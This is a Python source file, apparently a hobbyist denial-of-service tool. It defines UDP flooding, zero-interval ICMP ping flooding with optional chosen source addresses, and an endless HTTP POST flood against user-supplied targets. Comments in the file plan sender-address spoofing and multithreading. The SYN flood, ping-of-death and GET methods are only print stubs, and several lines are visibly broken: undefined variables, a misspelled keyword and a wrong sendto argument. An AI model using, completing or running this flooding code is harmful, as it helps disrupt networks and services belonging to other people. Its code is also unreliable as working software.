import requests as res
import socket as sockk
import time
import ping3
import platform

class VolumeBasedAttack:
    def udp_flooding(bye, vector, port):
        addr = tuple(vector)
        s = sockk.socket(sockk.AF_INET, sockk.SOCK_DGRAM)
        try: 
            while True:
                for i in addr:
                    s.sendto(bye, (addr, port))
                    
                #i'll add a method to change th ipaddr of the sender :), and AFTER ALL i'll implement a method to choose btween multithreading and multiprocessing
        except Exception as e:
            print(f'Error occurred: {e}')
        finally:
            s.close() 
        
        
    def icmp(vector, bye):
        if platform.system() == 'Linux':
            wifi = input("in linux u can use also wifi in ping mode, u want? (y/n) \n")
            if wifi == 'y':
                for i in vector:
                    ping3.verbose_ping(i, interface='wifi0', size=bye, count=0, interval=0)
            else:
                addre = input("u can also choose a source address, u want? (y/n) \n")
                if addr == y:
                    sources = input("write the ip addres(addresses): \n").split(" ")
                    for i in vector:
                        for ad in sources:
                            ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
                else:
                    for i in vector:
                        ping3.verbose_ping(i, size=bye, count=0, interval=0)
                    
        if platform.system() == 'Windows':
            response = input("u can choose a source address, u want? (y/n) \n")
            if response.lower() == 'y':
                source = input("write the ip addres(addresses): \n").split(" ")
                print("icmp attack with source addr ", source)
                for i in vector:
                    for ad in source:
                        ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
            else:
                print("No source address selected.\n")
                ping3.verbose_ping(i, size=bye, conut=0, interval=0)

class ProtocolAttack:
    def syn_flood(vector, bye, port):
        print(f"SYN flood attack on {vector} with {len(bye)} bytes")

    def pod(vector, bye, port):
        print(f"POD attack on {vector} with {len(bye)} bytes")

class ApplicationLayerAttack:
    def post(vector, bye):
        print(f"POST attack on {vector} with {len(bye)} bytes")
        print("Using POST method to:", vector)
        print("You have 10 seconds to end the attack, press Ctrl+C or Ctrl+Z")
        time.sleep(10)
        while True:
            for target in vector:
                response = res.post(target, data=bye)
                print(response.text)

    def get(vector, bye):
        print(f"GET attack  on {vector} with {len(bye)} bytes")
